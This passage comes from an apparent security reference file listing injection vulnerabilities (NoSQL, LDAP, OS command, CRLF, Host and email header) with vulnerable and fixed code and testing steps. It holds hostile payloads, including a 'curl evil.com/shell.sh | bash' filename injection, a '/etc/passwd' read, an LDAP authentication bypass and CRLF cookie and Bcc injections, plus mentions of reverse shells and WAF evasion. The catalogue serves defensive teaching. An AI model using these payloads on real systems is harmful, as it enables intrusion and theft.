      "Test query-string parameter pollution style injection: field[$ne]=1 which many Node.js query parsers convert into nested operator objects",
      "If $where or server-side JS evaluation is reachable, test for blind extraction via injected JS conditionals and for RCE via known $where sandbox escapes",
      "Test $regex-based character-by-character extraction of fields you should not have access to (password hashes, tokens)"
    ],
    remediation:
      "Validate and coerce every input to its expected primitive type before it reaches the " +
      "database layer (reject objects where a string/number is expected) using a schema " +
      "validation library. Disable or tightly restrict the $where operator and " +
      "server-side JavaScript execution (MongoDB's javascriptEnabled setting). Use the " +
      "official driver's typed query builders rather than passing raw parsed request bodies " +
      "into find()/update() calls, and apply the principle of least privilege to the " +
      "database user's role permissions.",
    references: [
      "https://owasp.org/www-community/Injection_Theory",
      "https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Injection_Prevention_Cheat_Sheet.html",
      "https://portswigger.net/web-security/nosql-injection"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "nosql-injection-couchdb",
    name: "NoSQL Injection (CouchDB / Mango Query)",
    category: "Injection",
    cwe: "CWE-943",
    owasp_category: "A03:2021 - Injection",
    description:
      "CouchDB injection targets applications built on Apache CouchDB's HTTP API and its " +
      "Mango query language (a JSON-based selector syntax similar in spirit to MongoDB's " +
      "query operators), or that expose raw map/reduce view creation to users. Because " +
      "CouchDB is accessed entirely over HTTP with JSON payloads, injection commonly " +
      "manifests as selector manipulation (injecting $or, $regex, or $exists into a Mango " +
      "selector) or, in more severe cases, injection into the design document's map/reduce " +
      "JavaScript functions if the application lets users influence view definitions.\n\n" +
      "A second, CouchDB-specific risk is direct exposure of the Fauxton admin interface or " +
      "the raw _all_dbs, _users, and database-level HTTP endpoints without authentication -- " +
      "historically a major source of breaches (CVE-2017-12635/12636 allowed unauthenticated " +
      "admin account creation via a JSON type-confusion in the _users document handling, " +
      "chained with the JavaScript engine to achieve remote code execution).",
    impact:
      "Unauthorized reads of documents outside the intended query scope via selector " +
      "manipulation; full database enumeration if administrative HTTP endpoints are exposed; " +
      "in the case of CVE-2017-12635/12636, complete server takeover via a two-step " +
      "privilege-escalation-to-RCE chain.",
    examples: [
      {
        title: "Node.js app building a Mango selector from unvalidated request fields",
        vulnerable_code:
          "app.get('/api/notes', async (req, res) => {\n" +
          "  const selector = { owner: req.query.owner, deleted: false };\n" +
          "  if (req.query.tag) selector.tags = req.query.tag;\n" +
          "  const result = await nano.db.use('notes').find({ selector });\n" +
          "  res.json(result.docs);\n" +
          "});",
        fixed_code:
          "app.get('/api/notes', async (req, res) => {\n" +
          "  const owner = String(req.query.owner || '');\n" +
          "  const tag = req.query.tag !== undefined ? String(req.query.tag) : undefined;\n" +
          "  if (!/^[a-zA-Z0-9_-]{1,64}$/.test(owner)) return res.status(400).end();\n" +
          "  const selector = { owner, deleted: false };\n" +
          "  if (tag) {\n" +
          "    if (!/^[a-zA-Z0-9_-]{1,32}$/.test(tag)) return res.status(400).end();\n" +
          "    selector.tags = tag;\n" +
          "  }\n" +
          "  const result = await nano.db.use('notes').find({ selector });\n" +
          "  res.json(result.docs);\n" +
          "});",
        explanation:
          "Because req.query is parsed into nested objects, a request like " +
          "/api/notes?owner[$gt]=&tag[$regex]=.* replaces the intended string comparisons " +
          "with operator objects, returning every user's notes regardless of ownership. The " +
          "fix coerces every parameter to a string and validates it against a strict " +
          "allowlist pattern before it is placed into the selector, so operator objects can " +
          "never reach the query."
      }
    ],
    detection_methods: [
      "Test query parameters for operator-object injection using bracket notation (field[$gt]=)",
      "Check whether Fauxton (/_utils) or raw database endpoints (/_all_dbs, /_users/_all_docs) are reachable without authentication",
      "Review any feature that lets users define or influence CouchDB views/design documents for JavaScript injection into map/reduce functions"
    ],
    tools: ["curl / httpie for raw HTTP API probing", "Burp Suite", "Nmap NSE http-couchdb-status script"],
    automated_testing:
      "`curl http://target:5984/_all_dbs` and `curl http://target:5984/_users/_all_docs` " +
      "with no authentication reveal whether the instance is misconfigured for anonymous " +
      "access; Nmap's `--script http-couchdb-status` fingerprints version and exposed " +
      "endpoints to flag instances vulnerable to CVE-2017-12635/12636.",
    manual_testing: [
      "Enumerate whether the CouchDB HTTP API (default port 5984) is reachable and whether admin party mode (no auth) is enabled",
      "Attempt bracket-notation operator injection on every query-string and JSON body parameter feeding a Mango selector",
      "For older CouchDB versions, test the roles-array type confusion privilege escalation (send \"roles\":\"_admin\" as a JSON string vs array to a _users document PUT) followed by exploitation of the JS query server for RCE",
      "Review design documents for any input passed into map/reduce function source at runtime"
    ],
    remediation:
      "Coerce and strictly validate every field used in a Mango selector to its expected " +
      "primitive type and format before constructing the query. Require authentication on " +
      "all CouchDB HTTP endpoints, disable admin party mode, keep CouchDB patched (versions " +
      "after 2.1.1 fix CVE-2017-12635/12636), and never allow untrusted users to author or " +
      "influence design document JavaScript.",
    references: [
      "https://docs.couchdb.org/en/stable/api/database/find.html",
      "https://nvd.nist.gov/vuln/detail/CVE-2017-12635",
      "https://nvd.nist.gov/vuln/detail/CVE-2017-12636"
    ],
    difficulty: "Medium",
    commonness: "Uncommon"
  },

  {
    id: "ldap-injection",
    name: "LDAP Injection",
    category: "Injection",
    cwe: "CWE-90",
    owasp_category: "A03:2021 - Injection",
    description:
      "LDAP injection occurs when user input is concatenated into an LDAP search filter " +
      "(RFC 4515 filter syntax) without escaping the special characters that carry meaning " +
      "in that grammar: parentheses, asterisks, ampersands, pipes, backslashes, and NUL. " +
      "Because LDAP filters use a Polish-notation-like syntax (e.g. (&(uid=alice)(pwd=secret))), " +
      "an attacker who can inject a closing parenthesis followed by their own filter clause " +
      "can short-circuit authentication checks or broaden search scope to enumerate directory " +
      "objects far beyond what was intended.\n\n" +
      "A very common vulnerable pattern is a login filter built as " +
      "(&(uid=USERINPUT)(userPassword=PASSINPUT)) -- submitting uid=*)(uid=*))(|(uid=* " +
      "turns the filter into one that matches any entry, bypassing the password check " +
      "entirely, similar in spirit to SQL injection's ' OR '1'='1. Blind LDAP injection is " +
      "also possible using boolean-based inference against attributes the application does " +
      "not directly display.",
    impact:
      "Authentication bypass against LDAP-backed login systems; enumeration of directory " +
      "contents (usernames, group memberships, organizational structure, sometimes password " +
      "attributes if misconfigured); in write-capable directory operations, unauthorized " +
      "attribute modification.",
    examples: [
      {
        title: "Java JNDI login using string-built LDAP filter",
        vulnerable_code:
          "String filter = \"(&(uid=\" + username + \")(userPassword=\" + password + \"))\";\n" +
          "NamingEnumeration<SearchResult> results = ctx.search(\n" +
          "    \"ou=people,dc=example,dc=com\", filter, searchControls\n" +
          ");\n" +
          "boolean authenticated = results.hasMore();",
        fixed_code:
          "String safeUsername = escapeLdapSearchFilter(username);\n" +
          "String safePassword = escapeLdapSearchFilter(password);\n" +
          "String filter = \"(&(uid=\" + safeUsername + \")(userPassword=\" + safePassword + \"))\";\n" +
          "NamingEnumeration<SearchResult> results = ctx.search(\n" +
          "    \"ou=people,dc=example,dc=com\", filter, searchControls\n" +
          ");\n" +
          "boolean authenticated = results.hasMore();\n\n" +
          "// escapeLdapSearchFilter escapes \\, *, (, ), and NUL per RFC 4515:\n" +
          "static String escapeLdapSearchFilter(String input) {\n" +
          "    StringBuilder sb = new StringBuilder();\n" +
          "    for (char c : input.toCharArray()) {\n" +
          "        switch (c) {\n" +
          "            case '\\\\': sb.append(\"\\\\5c\"); break;\n" +
          "            case '*':  sb.append(\"\\\\2a\"); break;\n" +
          "            case '(':  sb.append(\"\\\\28\"); break;\n" +
          "            case ')':  sb.append(\"\\\\29\"); break;\n" +
          "            case '\\0': sb.append(\"\\\\00\"); break;\n" +
          "            default: sb.append(c);\n" +
          "        }\n" +
          "    }\n" +
          "    return sb.toString();\n" +
          "}",
        explanation:
          "Submitting username = *)(uid=*))(|(uid=* with any password value turns the filter " +
          "into (&(uid=*)(uid=*))(|(uid=*)(userPassword=whatever)) which matches the first " +
          "entry in the directory regardless of password, bypassing authentication. The fix " +
          "escapes every RFC 4515 special character in user-supplied filter components before " +
          "they are embedded in the filter string, so parentheses and asterisks can never " +
          "alter the filter's logical structure."
      }
    ],
    detection_methods: [
      "Inject *, (, ), &, |, and \\ characters individually into username/search fields and observe for LDAP errors or altered result sets",
      "Test the classic auth-bypass payload *)(uid=*))(|(uid=* in username fields",
      "For search/filter features, test wildcard injection (*) to see if it returns more results than expected"
    ],
    tools: ["Burp Suite", "ldapsearch (for whitebox baseline comparison)", "custom fuzzing scripts with RFC 4515 special characters"],
    automated_testing:
      "There is no single dominant automated LDAP injection scanner; Burp Suite's active " +
      "scanner includes some LDAP injection checks, but manual testing with a curated " +
      "payload list (parentheses, wildcards, boolean operators) via Intruder is more " +
      "reliable. Confirm findings against a test LDAP server (OpenLDAP in Docker) when " +
      "possible to validate filter behavior safely.",
    manual_testing: [
      "Identify every field that feeds an LDAP search or bind filter (login username, directory search boxes, address book lookups)",
      "Inject a single ) character and look for LDAP protocol errors surfaced in the response",
      "Attempt the authentication bypass payload *)(uid=*))(|(uid=* as the username with an arbitrary password",
      "Test wildcard-only input (*) in search fields to check for full directory enumeration",
      "For blind scenarios, use boolean-based attribute inference: (&(uid=victim)(attribute=a*)) vs (&(uid=victim)(attribute=b*)) to narrow down attribute values character by character"
    ],
    remediation:
      "Escape all RFC 4515 special characters (\\, *, (, ), NUL) in any user input before " +
      "embedding it in an LDAP filter, using the language/library's built-in escaping " +
      "function where available (e.g. Java's javax.naming does not escape automatically -- " +
      "use a vetted utility such as OWASP ESAPI's encodeForLDAP, or Python's ldap3 library " +
      "with escape_filter_chars). Apply least privilege to the LDAP bind account used by the " +
      "application, and prefer parameterized/structured filter builders over manual string " +
      "concatenation where the LDAP library provides one.",
    references: [
      "https://owasp.org/www-community/attacks/LDAP_Injection",
      "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html",
      "https://datatracker.ietf.org/doc/html/rfc4515"
    ],
    difficulty: "Medium",
    commonness: "Uncommon"
  },

  {
    id: "os-command-injection",
    name: "OS Command Injection",
    category: "Injection",
    cwe: "CWE-78",
    owasp_category: "A03:2021 - Injection",
    description:
      "OS command injection occurs when an application passes user-controlled input to a " +
      "shell interpreter (via system(), exec(), popen(), subprocess with shell=True, " +
      "child_process.exec() in Node.js, or backticks/Runtime.exec with a shell wrapper) " +
      "without neutralizing shell metacharacters. Because the shell itself parses the " +
      "command string, characters like ;, &&, ||, |, $(), backticks, and newlines let an " +
      "attacker terminate the intended command and chain arbitrary additional commands of " +
      "their own choosing.\n\n" +
      "This is distinct from argument injection, where a command is invoked without a shell " +
      "(e.g. execve with an argv array) but the attacker can still inject unexpected flags " +
      "or arguments (such as injecting -- options or a second filename) because argument " +
      "boundaries are not properly enforced. Command injection is one of the most severe web " +
      "vulnerability classes because successful exploitation typically yields direct code " +
      "execution in the context of the web server process, often the fastest path to full " +
      "host compromise.",
    impact:
      "Arbitrary command execution as the web server user, frequently escalating to full " +
      "host compromise via further local privilege escalation; reverse shell access; " +
      "reading/writing any file the process user can access; lateral movement into internal " +
      "networks from the compromised host; data destruction or ransomware deployment.",
    examples: [
      {
        title: "Python Flask ping utility using os.system with unsanitized host input",
        vulnerable_code:
          "import os\n" +
          "from flask import Flask, request\n\n" +
          "app = Flask(__name__)\n\n" +
          "@app.route('/ping')\n" +
          "def ping():\n" +
          "    host = request.args.get('host')\n" +
          "    result = os.popen(f'ping -c 4 {host}').read()\n" +
          "    return f'<pre>{result}</pre>'",
        fixed_code:
          "import subprocess\n" +
          "import ipaddress\n" +
          "from flask import Flask, request, abort\n\n" +
          "app = Flask(__name__)\n\n" +
          "@app.route('/ping')\n" +
          "def ping():\n" +
          "    host = request.args.get('host', '')\n" +
          "    try:\n" +
          "        ipaddress.ip_address(host)\n" +
          "    except ValueError:\n" +
          "        abort(400, 'invalid IP address')\n" +
          "    result = subprocess.run(\n" +
          "        ['ping', '-c', '4', host],\n" +
          "        capture_output=True, text=True, timeout=10, shell=False\n" +
          "    )\n" +
          "    return f'<pre>{result.stdout}</pre>'",
        explanation:
          "Requesting /ping?host=8.8.8.8;cat%20/etc/passwd runs `ping -c 4 8.8.8.8;cat " +
          "/etc/passwd` because os.popen() spawns /bin/sh -c and the semicolon terminates " +
          "the ping command, chaining an arbitrary second command that dumps the password " +
          "file into the response. The fix validates that the input is a syntactically valid " +
          "IP address using Python's ipaddress module (an allowlist of a strict format) and " +
          "invokes subprocess.run() with an argv list and shell=False, so no shell is ever " +
          "spawned to interpret metacharacters."
      },
      {
        title: "Node.js file conversion service using child_process.exec",
        vulnerable_code:
          "const { exec } = require('child_process');\n" +
          "app.post('/convert', (req, res) => {\n" +
          "  const filename = req.body.filename;\n" +
          "  exec(`convert /uploads/${filename} /uploads/${filename}.png`, (err, stdout) => {\n" +
          "    if (err) return res.status(500).end();\n" +
          "    res.download(`/uploads/${filename}.png`);\n" +
          "  });\n" +
          "});",
        fixed_code:
          "const { execFile } = require('child_process');\n" +
          "const path = require('path');\n\n" +
          "app.post('/convert', (req, res) => {\n" +
          "  const filename = path.basename(req.body.filename || '');\n" +
          "  if (!/^[a-zA-Z0-9._-]+\\.(jpg|jpeg|png|gif)$/.test(filename)) {\n" +
          "    return res.status(400).end();\n" +
          "  }\n" +
          "  const src = path.join('/uploads', filename);\n" +
          "  const dst = path.join('/uploads', `${filename}.png`);\n" +
          "  execFile('convert', [src, dst], (err) => {\n" +
          "    if (err) return res.status(500).end();\n" +
          "    res.download(dst);\n" +
          "  });\n" +
          "});",
        explanation:
          "child_process.exec() runs the given string through /bin/sh, so a filename of " +
          "\"a.jpg; curl evil.com/shell.sh | bash\" chains a reverse-shell download and " +
          "execution after the convert command. The fix switches to execFile(), which " +
          "invokes the binary directly with an argv array and never spawns a shell, and " +
          "additionally validates the filename against a strict extension allowlist and " +
          "strips path components with path.basename() to also prevent path traversal."
      }
    ],
    detection_methods: [
      "Inject shell metacharacters (; & | $() ` newline) into every parameter that might reach a system call, and observe for command output, delays, or errors",
      "Use out-of-band techniques (nslookup/curl to an attacker-controlled domain) to confirm blind command injection when output is not reflected",
      "Review source/decompiled code for exec, system, popen, ProcessBuilder, Runtime.exec, shell_exec, or child_process.exec calls built from request data"
    ],
    tools: ["commix", "Burp Suite Collaborator (OOB detection)", "Metasploit (post-exploitation once confirmed)", "custom OOB payloads via Interactsh"],
    automated_testing:
      "commix automates detection and exploitation across classic, blind, and time-based " +
      "command injection: `commix --url=\"https://target/ping?host=1\" --data=\"\" -p host` " +
      "or with a raw request file via `--request-file=req.txt`, and supports OOB techniques " +
      "when paired with `--tamper` scripts for WAF evasion. Burp Collaborator payloads " +
      "(`; nslookup UNIQUEID.burpcollaborator.net`) confirm blind injection reliably when " +
      "responses give no direct feedback.",
    manual_testing: [
      "Identify parameters that plausibly reach shell commands: hostnames, filenames, IP addresses, conversion/utility features, report generators",
      "Inject basic separators one at a time: ; whoami, | whoami, && whoami, `whoami`, $(whoami) and check for reflected output",
      "If output is not reflected, use time-based confirmation: ; sleep 10 and measure response latency",
      "If time-based also fails, use out-of-band confirmation: ; nslookup unique-id.oob-domain.com or ; curl http://unique-id.oob-domain.com",
      "Once confirmed, escalate to a reverse shell payload appropriate to the target OS (bash -i, PowerShell -enc, netcat) via the injection point",
      "Test argument injection separately even where shell metacharacters are filtered: e.g. injecting --output=/etc/cron.d/evil into a command that takes user-controlled flags"
    ],
    remediation:
      "Avoid invoking a shell at all: use execve-style APIs that take an argv array " +
      "(subprocess.run with shell=False and a list, execFile in Node.js, ProcessBuilder in " +
      "Java) so there is no shell metacharacter grammar to inject into. Where a shell truly " +
      "cannot be avoided, apply strict allowlist input validation appropriate to the expected " +
      "format (IP address, filename pattern) rather than attempting to blacklist dangerous " +
      "characters, which is reliably bypassable. Run the process with the minimum OS " +
      "privileges required, apply seccomp/AppArmor sandboxing where possible, and never " +
      "construct commands from unsanitized filenames without normalizing/validating the path " +
      "component first.",
    references: [
      "https://owasp.org/www-community/attacks/Command_Injection",
      "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
      "https://cwe.mitre.org/data/definitions/78.html"
    ],
    difficulty: "Easy",
    commonness: "Common"
  },

  {
    id: "crlf-injection",
    name: "CRLF Injection",
    category: "Injection",
    cwe: "CWE-93",
    owasp_category: "A03:2021 - Injection",
    description:
      "CRLF injection occurs when an application places unsanitized user input into a " +
      "context where carriage-return/line-feed characters (\\r\\n, URL-encoded as %0d%0a) " +
      "are meaningful protocol delimiters, most commonly raw HTTP response headers. Because " +
      "HTTP headers are separated by CRLF and the header block is terminated by a double " +
      "CRLF, an attacker who can inject these bytes into a header value (a redirect Location " +
      "built from user input, a cookie value, a custom header echoing a request parameter) " +
      "can inject entirely new headers or prematurely terminate the header block and begin " +
      "writing the HTTP response body.\n\n" +
      "CRLF injection is the root mechanism behind several higher-impact attacks: HTTP " +
      "response splitting (injecting a second, fully attacker-controlled HTTP response that " +
      "gets cached or interpreted as a reply to a different request by an intermediary), " +
      "session fixation via injected Set-Cookie headers, and reflected XSS achieved by " +
      "injecting a Content-Type or body directly. Modern frameworks largely reject raw " +
      "CR/LF in header-setting APIs, but log injection (writing forged CRLF-separated log " +
      "entries to fool SIEM parsing or forge audit trails) remains common wherever request " +
      "data is written to plaintext logs without encoding.",
    impact:
      "Injection of arbitrary HTTP response headers (cache-control poisoning, forged " +
      "Set-Cookie for session fixation, CORS header injection); HTTP response splitting " +
      "leading to cache poisoning or reflected content injection; log forging that hides " +
      "malicious activity or injects fake log entries to mislead incident response.",
    examples: [
      {
        title: "Java servlet setting a redirect header from a request parameter",
        vulnerable_code:
          "String returnUrl = request.getParameter(\"returnUrl\");\n" +
          "response.setHeader(\"Location\", returnUrl);\n" +
          "response.setStatus(302);",
        fixed_code:
          "String returnUrl = request.getParameter(\"returnUrl\");\n" +
          "if (returnUrl == null || !ALLOWED_PATHS.matcher(returnUrl).matches()) {\n" +
          "    returnUrl = \"/home\";\n" +
          "}\n" +
          "// Reject/strip any CR or LF defensively even though the allowlist regex\n" +
          "// already excludes them:\n" +
          "returnUrl = returnUrl.replaceAll(\"[\\r\\n]\", \"\");\n" +
          "response.sendRedirect(returnUrl);",
        explanation:
          "A returnUrl value of /home%0d%0aSet-Cookie:%20session=attacker-fixed-value " +
          "injects a forged Set-Cookie header into the response when the servlet container " +
          "does not sanitize the header value, allowing session fixation. Modern servlet " +
          "containers (Tomcat 8.5+, Jetty) reject raw CR/LF in setHeader() by throwing an " +
          "exception, but relying solely on container behavior is fragile across " +
          "environments -- the fix pairs an explicit allowlist of internal redirect paths " +
          "with defensive stripping of CR/LF characters."
      }
    ],
    detection_methods: [
      "Inject %0d%0a followed by a marker header (X-Injected: test) into every parameter that influences a response header (redirects, custom headers, cookie values)",
      "Check whether the marker header appears in the raw HTTP response using a raw socket/curl -i rather than a browser (which normalizes headers)",
      "Test double CRLF (%0d%0a%0d%0a) followed by attacker-controlled HTML to attempt response splitting / body injection",
      "Grep logging code for direct writes of request parameters without newline stripping"
    ],
    tools: ["Burp Suite Repeater (raw request/response view)", "curl -i", "netcat for raw protocol-level testing"],
    automated_testing:
      "Burp Suite's active scanner flags header injection when a parameter's reflection " +
      "point is a response header and CRLF sequences survive; for precise confirmation, use " +
      "Repeater with `curl -i \"https://target/redirect?url=/x%0d%0aX-Injected:%20yes\"` and " +
      "inspect the raw response for the injected header.",
    manual_testing: [
      "Locate every parameter that ends up in a response header: redirect targets, custom API response headers, cookie name/value pairs",
      "Inject URL-encoded CRLF (%0d%0a) followed by a distinctive header name and value",
      "Fetch the response with a raw HTTP client (curl -i, netcat) rather than a browser, since browsers silently strip or reject malformed headers",
      "If a single injected header succeeds, attempt double CRLF to inject a full response body and test for reflected content/XSS via response splitting",
      "Test log-forging variants by injecting CRLF plus fake log-line content into any parameter that is written to application or access logs"
    ],
    remediation:
      "Never place raw user input into HTTP header values; use framework-provided header " +
      "and redirect APIs, which in current versions of most frameworks reject embedded " +
      "CR/LF automatically -- but do not rely on that alone. Strip or reject \\r and \\n " +
      "explicitly from any value destined for a header, validate redirect targets against " +
      "an allowlist of relative paths or a strict domain allowlist, and URL-encode values " +
      "written into logs (or use structured/JSON logging) to prevent log forging.",
    references: [
      "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
      "https://cwe.mitre.org/data/definitions/93.html"
    ],
    difficulty: "Easy",
    commonness: "Uncommon"
  },

  {
    id: "header-injection-host",
    name: "HTTP Host Header Injection",
    category: "Injection",
    cwe: "CWE-644",
    owasp_category: "A03:2021 - Injection",
    description:
      "Host header injection abuses applications that trust the client-supplied Host " +
      "header (or X-Forwarded-Host when behind a reverse proxy) to construct URLs used in " +
      "password reset emails, cache keys, absolute redirect links, or Origin validation, " +
      "instead of using a server-side configured canonical hostname. Because the Host " +
      "header is fully attacker-controlled in the raw HTTP request, an attacker can set it " +
      "to an arbitrary value and have that value reflected back into security-sensitive " +
      "contexts.\n\n" +
      "The most damaging real-world exploitation is password-reset poisoning: many " +
      "applications build the reset link as https://{Host header}/reset?token=... and email " +
      "it to the victim; if the attacker requests a password reset for the victim's account " +
      "while supplying an attacker-controlled Host header, the victim receives a legitimate " +
      "email containing a reset link pointing at the attacker's domain, and when the victim " +
      "clicks it, the token is delivered to the attacker's server logs. Host header " +
      "injection can also poison web caches (see Web Cache Poisoning) or bypass Host-based " +
      "virtual-host routing and access-control checks.",
    impact:
      "Account takeover via password-reset token theft; web cache poisoning affecting all " +
      "users served the poisoned cache entry; SSRF-adjacent routing bypass when internal " +
      "load balancers route based on Host; bypass of Host-based access restrictions or " +
      "virtual host isolation.",
    examples: [
      {
        title: "PHP password reset email built from $_SERVER['HTTP_HOST']",
        vulnerable_code:
          "<?php\n" +
          "$token = generateResetToken($userId);\n" +
          "$resetLink = 'https://' . $_SERVER['HTTP_HOST'] . '/reset?token=' . $token;\n" +
          "mail($userEmail, 'Password Reset', \"Click here: $resetLink\");\n" +
          "?>",
        fixed_code:
          "<?php\n" +
          "$token = generateResetToken($userId);\n" +
          "// Use a hardcoded, server-side configured canonical hostname, never client input\n" +
          "$resetLink = 'https://' . APP_CANONICAL_HOST . '/reset?token=' . $token;\n" +
          "mail($userEmail, 'Password Reset', \"Click here: $resetLink\");\n" +
          "?>",
        explanation:
          "An attacker requests POST /forgot-password with Host: evil.com and " +
          "email=victim@example.com. The application generates a valid reset token for the " +
          "victim and emails a link like https://evil.com/reset?token=REALTOKEN to the " +
          "victim's real inbox. When the victim clicks it (it looks legitimate since it came " +
          "from the real password-reset email flow), their token is sent to the attacker's " +
          "server, which can then use it against the real application to take over the " +
          "account. The fix replaces the dynamic Host header with a hardcoded, " +
          "server-side-configured canonical hostname that is never influenced by client " +
          "input."
      }
    ],
    detection_methods: [
      "Send requests with an arbitrary Host header (Host: attacker-controlled.example) and check if it is reflected in links, redirects, or cache behavior",
      "Test X-Forwarded-Host, X-Forwarded-Server, and X-Original-Host headers, which are often trusted even when the primary Host header is validated",
      "Trigger password-reset / email-verification flows while supplying a malicious Host header and inspect the resulting email content",
      "Test duplicate Host headers and Host header with a port/absolute-URI request-line variant to bypass naive validation"
    ],
    tools: ["Burp Suite Repeater", "curl -H \"Host: evil.com\"", "Param Miner (Burp extension, for discovering unkeyed/trusted headers)"],
    automated_testing:
      "Burp Suite's Param Miner extension automatically discovers headers that influence " +
      "application behavior without being part of the cache key, which is the exact " +
      "precondition for both Host header attacks and cache poisoning; run it against " +
      "candidate endpoints and review flagged 'unkeyed input' headers manually.",
    manual_testing: [
      "Send a baseline request and note any URL, link, or header that reflects the Host value",
      "Replace the Host header with an attacker-controlled domain and resend, checking all reflected locations (redirects, canonical link tags, CORS headers, emails)",
      "Trigger the password-reset flow with the manipulated Host header and check the generated email/link for the injected domain",
      "Test alternate trusted headers: X-Forwarded-Host, X-Forwarded-Server, X-Host, X-Original-URL in combination with or instead of Host",
      "Test malformed Host headers (absolute-form request line, duplicate Host headers, Host with embedded port oddities) to find validation bypasses"
    ],
    remediation:
      "Never derive security-sensitive URLs (password reset links, email verification " +
      "links, canonical/OG tags used for redirects) from the Host header or any " +
      "X-Forwarded-* header. Use a hardcoded, environment-configured canonical hostname on " +
      "the server side. If virtual hosting requires dynamic hostnames, validate the Host " +
      "header against a strict allowlist of known-good hostnames at the edge (load " +
      "balancer/reverse proxy) and reject requests with unrecognized Host values before " +
      "they reach the application.",
    references: [
      "https://portswigger.net/web-security/host-header",
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "header-injection-email",
    name: "Email Header Injection",
    category: "Injection",
    cwe: "CWE-93",
    owasp_category: "A03:2021 - Injection",
    description:
      "Email header injection is a CRLF injection variant specific to applications that " +
      "build raw SMTP/MIME messages (contact forms, 'send to a friend' features, " +
      "notification emails) by concatenating user input directly into header fields like " +
      "To, From, Subject, or Cc/Bcc. Because email headers are also newline-delimited, an " +
      "attacker who can inject \\r\\n into a Subject or From field can append entirely new " +
      "headers -- most dangerously additional Bcc: recipients, turning a simple contact form " +
      "into an open relay for spam, or a Content-Type header switching the message to " +
      "multipart/mixed to smuggle in a completely attacker-controlled message body.\n\n" +
      "This is especially prevalent in legacy PHP applications using the mail() function, " +
      "where the additional_headers parameter (the 4th argument) is frequently built via " +
      "string concatenation from a 'name' or 'reply-to' form field with no validation.",
    impact:
      "Turning the application's mail sending capability into a spam relay; injecting " +
      "additional Bcc recipients to exfiltrate a copy of every email the application sends; " +
      "forging the From/Reply-To to run phishing campaigns from the victim organization's " +
      "trusted mail infrastructure and SPF-authorized IP; smuggling attacker-controlled MIME " +
      "content, including HTML with embedded tracking pixels or credential-harvesting links.",
    examples: [
      {
        title: "PHP contact form with unsanitized name/reply-to header",
        vulnerable_code:
          "<?php\n" +
          "$name = $_POST['name'];\n" +
          "$email = $_POST['email'];\n" +
          "$message = $_POST['message'];\n" +
          "$headers = \"From: contact-form@example.com\\r\\n\";\n" +
          "$headers .= \"Reply-To: $name <$email>\\r\\n\";\n" +
          "mail('support@example.com', 'New contact form submission', $message, $headers);\n" +
          "?>",
        fixed_code:
          "<?php\n" +
          "function stripHeaderInjection(string $value): string {\n" +
          "    return trim(preg_replace('/[\\r\\n]+/', '', $value));\n" +
          "}\n\n" +
          "$name = stripHeaderInjection($_POST['name']);\n" +
          "$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);\n" +
          "if ($email === false) { http_response_code(400); exit('Invalid email'); }\n" +
          "$message = $_POST['message'];\n\n" +
          "$mailer = new PHPMailer(true);\n" +
          "$mailer->setFrom('contact-form@example.com', 'Contact Form');\n" +
          "$mailer->addReplyTo($email, $name);\n" +
          "$mailer->addAddress('support@example.com');\n" +
          "$mailer->Subject = 'New contact form submission';\n" +
          "$mailer->Body = $message;\n" +
          "$mailer->send();\n" +
          "?>",
        explanation:
          "Submitting name = \"Attacker\\r\\nBcc: victim1@x.com,victim2@x.com,...,victim500@x.com\" " +
          "appends hundreds of Bcc recipients to the outgoing mail, turning the contact form " +
          "into a bulk spam relay that sends from the organization's legitimate, " +
          "SPF/DKIM-authorized mail server. The fix both strips CR/LF defensively and, more " +
          "robustly, switches from raw mail()/string-built headers to a library " +
          "(PHPMailer) that constructs MIME headers using structured APIs (addReplyTo, " +
          "addAddress) which properly encode header values rather than concatenating raw " +
          "strings."
      }
    ],
    detection_methods: [
      "Inject %0d%0a (or raw CRLF if the form field allows multi-line input) followed by Bcc:, Cc:, or Content-Type: into name/subject/reply-to fields",
      "Check whether the injected header appears in the delivered email's raw source (View Source / Show Original in the receiving mail client)",
      "Review server-side code for direct use of PHP mail(), sendmail, or raw SMTP header concatenation instead of a vetted mail library"
    ],
    tools: ["Burp Suite", "a disposable test mailbox with raw-source viewing (Mailtrap, Gmail 'Show Original')", "manual SMTP testing via telnet/openssl s_client"],
    automated_testing:
      "No mainstream scanner reliably detects email header injection out of the box since " +
      "it requires inspecting delivered email headers rather than the HTTP response; the " +
      "practical approach is manual: submit CRLF-laden payloads to every mail-triggering " +
      "form pointed at a controlled mailbox (Mailtrap or similar) and inspect raw headers.",
    manual_testing: [
      "Identify every feature that sends email based on form input (contact forms, invite-a-friend, notification preferences)",
      "Submit CRLF sequences (%0d%0a in URL-encoded form submissions, or literal newlines in a raw HTTP request via Burp Repeater) in name/subject/reply-to fields, followed by a Bcc: header pointing to a test address",
      "Inspect the raw source of the received email at the legitimate recipient to confirm whether the injected header was honored",
      "Test Content-Type header injection to attempt smuggling an attacker-controlled MIME body"
    ],
    remediation:
      "Never build raw email headers via string concatenation; use a mature mail library " +
      "(PHPMailer, SwiftMailer/Symfony Mailer, Nodemailer) that exposes structured methods " +
      "for setting From/To/Cc/Bcc/Subject and encodes values correctly, rejecting embedded " +
      "CR/LF automatically. Validate email address fields with a proper RFC 5322 validator, " +
      "strip newlines defensively from any free-text field placed into a header, and " +
      "consider using a transactional email API (SendGrid, SES, Postmark) which further " +
      "isolates header construction from the application.",
    references: [
      "https://owasp.org/www-community/attacks/Email_Injection",
      "https://cwe.mitre.org/data/definitions/93.html"
    ],
    difficulty: "Easy",
    commonness: "Uncommon"
  },

  {
    id: "xml-injection",
    name: "XML Injection",
    category: "Injection",
    cwe: "CWE-91",
    owasp_category: "A03:2021 - Injection",
    description:
      "XML injection occurs when user input is embedded into an XML document without " +
      "proper escaping of XML-significant characters (<, >, &, \", '), allowing an attacker " +
      "to inject new elements, attributes, or CDATA sections that change the document's " +
      "structure and meaning as interpreted by the downstream XML parser. This differs from " +
      "XXE (which abuses external entity resolution) -- XML injection is about corrupting or " +
      "extending the document tree itself, for example injecting an additional " +
      "<role>admin</role> element into a user-submitted XML profile payload that the server " +
